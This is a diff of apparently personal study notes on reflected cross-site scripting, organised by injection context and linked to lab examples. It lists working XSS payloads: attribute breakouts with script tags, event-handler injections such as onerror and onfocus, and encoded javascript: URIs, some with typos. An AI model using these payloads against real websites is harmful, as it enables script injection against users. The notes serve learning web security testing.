@@ -11,20 +11,38 @@ EX:
 
 * [[XSS_examples#angle brackets encoded| angle brackets encoded]]
 
-* HTML context
+# HTML context
 
-	between html tags: (add new html tags `<script>` or `<img>`)
-		* [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| most tags and attr blocked]]
-		* [[XSS_examples#Reflected XSS just custom tags allowed| only custom tags allowed]]
-		* [[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate> allowed]]
-		* [[XSS_examples#Reflected XSS with some SVG markup allowed| SVG markup allowed]]
-	into html tags:
-		* terminate the attribute value, close the tag, and introduce a new one 
-			`"><script>alert(document.domain)</script>`
-		* if `<>` encoded: add a new attribute that creates a scriptable context:
-			`" autofocus onfocus=alert(document.domain) x="`
-		*  with angle brackets encoded: `"onmouseover="alert(1)`
-		* [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]
+## out of tags
+
+- use a `<script` tags
+- open a tag + event handler, e.g. `<img/src/onerror=alert(origin)>`
+- `<a>` tag  + js scheme, e.g. `<a href=javascripot:alert(origin)>test</a>`
+    • and it's HTML encoded variations (get's decoded because it's inside an html
+      attribute).
+    • also combined with character reference. : --> &colon;
+    • and Unicode encoded variations only inside js URI.
+    • <a href={htmlencoded}avascripot{character reference}{Unicoded}lert(origin)>test</a>
+- non-executable tags
+
+EX:
+
+[[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| most tags and attr blocked]]
+[[XSS_examples#Reflected XSS just custom tags allowed| only custom tags allowed]]
+[[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate> allowed]]
+[[XSS_examples#Reflected XSS with some SVG markup allowed| SVG markup allowed]]
+
+
+footnote:
+  • get event handlers: `Object.keys(window).filter(k => !k.indexOf('on'))`
+## into html tags:
+
+* terminate the attribute value, close the tag, and introduce a new one 
+	`"><script>alert(document.domain)</script>`
+* if `<>` encoded: add a new attribute that creates a scriptable context:
+	`" autofocus onfocus=alert(document.domain) x="`
+*  with angle brackets encoded: `"onmouseover="alert(1)`
+* [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]
 		
 * javascript context:
 	* close the script tag and add new html tags:
